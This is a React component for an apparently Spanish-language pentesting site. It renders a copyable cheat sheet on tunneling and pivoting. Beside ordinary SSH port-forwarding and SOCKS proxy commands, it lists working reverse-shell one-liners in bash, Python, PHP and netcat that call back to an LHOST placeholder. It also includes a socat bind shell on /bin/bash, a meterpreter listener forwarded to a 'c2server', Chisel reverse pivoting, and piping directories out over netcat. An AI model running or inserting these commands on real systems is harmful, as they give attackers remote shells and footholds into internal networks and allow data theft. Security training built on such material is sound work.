import { useState } from 'react'
import ToolShell from '../components/ToolShell'
import { Copy, Check, Shield, ChevronDown, ChevronUp } from 'lucide-react'

const COLOR = '#8b5cf6'

const COMMANDS = [
  {
    cat: '🔑 SSH — Conexión y opciones avanzadas',
    items: [
      { cmd:'ssh user@host -p 2222', desc:'Conectar a puerto SSH no estándar (por defecto 22)' },
      { cmd:'ssh -i clave.pem user@host', desc:'Autenticación con clave privada (AWS, VPS)' },
      { cmd:'ssh -v user@host', desc:'Debug nivel 1 — ver handshake y errores de autenticación' },
      { cmd:'ssh -vvv user@host', desc:'Debug nivel 3 — diagnóstico completo' },
      { cmd:'ssh -o StrictHostKeyChecking=no user@host', desc:'No pedir confirmación al conectar a host nuevo (cuidado en producción)' },
      { cmd:'ssh -o ConnectTimeout=5 user@host', desc:'Timeout de conexión 5 segundos' },
      { cmd:'ssh-keygen -t ed25519 -C "audit@test"', desc:'Generar par de claves ED25519 (más seguro que RSA)' },
      { cmd:'ssh-copy-id -i ~/.ssh/id_ed25519.pub user@host', desc:'Copiar clave pública al servidor para acceso sin contraseña' },
    ]
  },
  {
    cat: '🔀 Port Forwarding Local (-L)',
    items: [
      { cmd:'ssh -L 8080:destino:80 user@saltador', desc:'Redirigir localhost:8080 → destino:80 a través del saltador SSH' },
      { cmd:'ssh -L 3306:192.168.1.50:3306 user@bastion', desc:'Acceder a MySQL interno en 192.168.1.50 via bastion' },
      { cmd:'ssh -L 8080:destino:80 -N -f user@host', desc:'-N = no ejecutar cmd, -f = ir a background (túnel puro)' },
      { cmd:'ssh -L 0.0.0.0:8080:destino:80 user@host', desc:'Escuchar en todas las interfaces locales (accesible desde LAN)' },
      { cmd:'# Usar: curl http://localhost:8080/ → tráfico va a destino:80 via SSH', desc:'' },
    ]
  },
  {
    cat: '🔄 Port Forwarding Remoto (-R)',
    items: [
      { cmd:'ssh -R 9090:localhost:80 user@externo', desc:'Exponer localhost:80 en el servidor remoto en puerto 9090' },
      { cmd:'ssh -R 0.0.0.0:9090:localhost:80 user@externo', desc:'Túnel inverso accesible desde cualquier IP en el servidor' },
      { cmd:'ssh -R 4444:localhost:4444 user@c2server', desc:'Técnica C2: exponer listener de meterpreter en servidor externo' },
      { cmd:'# Detectar: ss -tnp | grep sshd → búsca puertos raros abiertos por sshd', desc:'' },
    ]
  },
  {
    cat: '🌐 Proxy SOCKS Dinámico (-D)',
    items: [
      { cmd:'ssh -D 1080 user@host', desc:'Crear proxy SOCKS5 en localhost:1080 — todo el tráfico pasa por SSH' },
      { cmd:'ssh -D 1080 -N -f user@host', desc:'Proxy SOCKS5 en background (persistente)' },
      { cmd:'proxychains nmap -sT 192.168.1.0/24', desc:'Enrutar nmap a través del proxy SOCKS (pivotar a red interna)' },
      { cmd:'proxychains curl http://192.168.1.10/', desc:'Acceder a hosts internos via proxychains' },
      { cmd:'# Configurar proxychains: /etc/proxychains.conf → socks5 127.0.0.1 1080', desc:'' },
      { cmd:'# En navegador: FoxyProxy → SOCKS5 → 127.0.0.1:1080 → navegar red interna', desc:'' },
    ]
  },
  {
    cat: '🪓 Netcat (nc) — Swiss Army Knife',
    items: [
      { cmd:'nc -lvnp 4444', desc:'Listener: escuchar en puerto 4444 (l=listen, v=verbose, n=no DNS, p=port)' },
      { cmd:'nc 192.168.1.x 4444', desc:'Conectar al listener en el objetivo' },
      { cmd:'nc -z -v host 20-80', desc:'Escaneo de rango de puertos (sin enviar datos)' },
      { cmd:'bash -i >& /dev/tcp/LHOST/4444 0>&1', desc:'Reverse shell bash pura hacia listener nc' },
      { cmd:'nc -l 9999 | tar xzf -', desc:'Recibir directorio comprimido via netcat (receptor)' },
      { cmd:'tar czf - /directorio | nc destino 9999', desc:'Enviar directorio via netcat (emisor)' },
    ]
  },
  {
    cat: '⚡ Reverse Shells — One-liners',
    items: [
      { cmd:'bash -i >& /dev/tcp/LHOST/4444 0>&1', desc:'Reverse shell bash TCP' },
      { cmd:'python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'LHOST\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"', desc:'Reverse shell Python3' },
      { cmd:'php -r \'$sock=fsockopen("LHOST",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'', desc:'Reverse shell PHP' },
      { cmd:'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST 4444 >/tmp/f', desc:'Reverse shell con named pipe (más compatible)' },
      { cmd:'# Mejorar shell: python3 -c "import pty;pty.spawn(\'/bin/bash\')"', desc:'' },
      { cmd:'# Ctrl+Z → stty raw -echo; fg → TTY interactiva completa', desc:'' },
    ]
  },
  {
    cat: '🔗 Chisel / Ligolo — Pivoting avanzado',
    items: [
      { cmd:'# Servidor (atacante): chisel server -p 8000 --reverse', desc:'' },
      { cmd:'# Cliente (objetivo): chisel client LHOST:8000 R:1080:socks', desc:'Proxy SOCKS5 reverso via Chisel (ideal cuando SSH no está disponible)' },
      { cmd:'# Ligolo-ng: más moderno, crea interfaz de red virtual', desc:'' },
      { cmd:'socat TCP-LISTEN:8888,fork TCP:192.168.1.10:80', desc:'Reenvío de puerto con socat (alternativa a SSH port forwarding)' },
      { cmd:'socat TCP-LISTEN:4444,fork EXEC:"/bin/bash"', desc:'Shell bind con socat en puerto 4444' },
    ]
  },
]

function CopyBtn({ text }) {
  const [copied, setCopied] = useState(false)
  if (!text || text.startsWith('#')) return null
  const copy = () => { navigator.clipboard.writeText(text).then(() => { setCopied(true); setTimeout(()=>setCopied(false),1500) }) }
  return (
    <button onClick={copy} style={{ padding:'4px 8px', borderRadius:6, cursor:'pointer', border:'none', transition:'all .15s', flexShrink:0,
      background: copied ? 'rgba(16,185,129,0.2)' : 'rgba(139,92,246,0.12)', color: copied ? '#10b981' : '#8b5cf6' }}>
      {copied ? <Check size={12}/> : <Copy size={12}/>}
    </button>
  )
}

export default function ToolTunnels() {
  const [open, setOpen] = useState({})
  const toggle = (cat) => setOpen(o => ({ ...o, [cat]: !o[cat] }))

  return (
    <ToolShell icon="🔗" name="Túneles & Pivoting" color={COLOR} badge="SSH -L/-R/-D · Netcat · Reverse Shell · Chisel · proxychains · socat">
      <div style={{ maxWidth:960, margin:'0 auto', padding:'32px 24px' }}>

        <div style={{ display:'flex', gap:8, padding:'11px 14px', borderRadius:9, marginBottom:18,
          background:'rgba(139,92,246,0.08)', border:'1px solid rgba(139,92,246,0.2)',
          color:'rgba(255,255,255,0.5)', fontSize:11 }}>
          <Shield size={13} style={{ color:'#8b5cf6', flexShrink:0, marginTop:1 }}/>
          <span>El pivoting permite acceder a redes internas no expuestas usando un host comprometido como puente. SSH es la herramienta más limpia; proxychains + SOCKS5 es la combinación más versátil.</span>
        </div>

        <div style={{ display:'grid', gridTemplateColumns:'repeat(auto-fit, minmax(150px,1fr))', gap:10, marginBottom:24 }}>
          {[
            { label:'ssh -L', icon:'→', color:'#3b82f6', desc:'Local: puerto local → destino remoto' },
            { label:'ssh -R', icon:'←', color:'#ef4444', desc:'Remoto: expone local en servidor' },
            { label:'ssh -D', icon:'⊕', color:'#10b981', desc:'SOCKS5 dinámico' },
            { label:'Netcat', icon:'🪓', color:'#f59e0b', desc:'Listener, transfers, shells' },
            { label:'proxychains', icon:'⛓️', color:'#8b5cf6', desc:'Enrutar cualquier tool via SOCKS' },
          ].map(item => (
            <div key={item.label} style={{ background:'rgba(255,255,255,0.03)', border:`1px solid ${item.color}20`, borderRadius:10, padding:'12px', textAlign:'center' }}>
              <div style={{ fontSize:20, marginBottom:4, color:item.color, fontWeight:'bold', fontFamily:'monospace' }}>{item.icon}</div>
              <div style={{ color:item.color, fontSize:12, fontWeight:700, marginBottom:4 }}>{item.label}</div>
              <div style={{ color:'rgba(255,255,255,0.35)', fontSize:10 }}>{item.desc}</div>
            </div>
          ))}
        </div>

        {COMMANDS.map(cat => (
          <div key={cat.cat} style={{ marginBottom:10, background:'rgba(255,255,255,0.02)', border:'1px solid rgba(255,255,255,0.07)', borderRadius:12, overflow:'hidden' }}>
            <button onClick={()=>toggle(cat.cat)} style={{ width:'100%', display:'flex', justifyContent:'space-between', alignItems:'center', padding:'12px 16px', background:'none', border:'none', cursor:'pointer', color:'rgba(255,255,255,0.7)', fontSize:13, fontWeight:600, textAlign:'left' }}>
              {cat.cat}{open[cat.cat] ? <ChevronUp size={14}/> : <ChevronDown size={14}/>}
            </button>
            {open[cat.cat] && (
              <div style={{ padding:'0 12px 12px', display:'flex', flexDirection:'column', gap:8 }}>
                {cat.items.map((item,i) => (
                  <div key={i} style={{ background:'rgba(0,0,0,0.3)', borderRadius:9, padding:'10px 12px' }}>
                    <div style={{ display:'flex', gap:8, alignItems:'flex-start', marginBottom: item.desc ? 6 : 0 }}>
                      <code style={{ flex:1, fontSize:11, color: item.cmd.startsWith('#') ? 'rgba(255,255,255,0.3)' : '#c4b5fd', fontFamily:'monospace', lineHeight:1.5 }}>{item.cmd}</code>
                      <CopyBtn text={item.cmd}/>
                    </div>
                    {item.desc && <div style={{ color:'rgba(255,255,255,0.4)', fontSize:11 }}>{item.desc}</div>}
                  </div>
                ))}
              </div>
            )}
          </div>
        ))}

      </div>
    </ToolShell>
  )
}
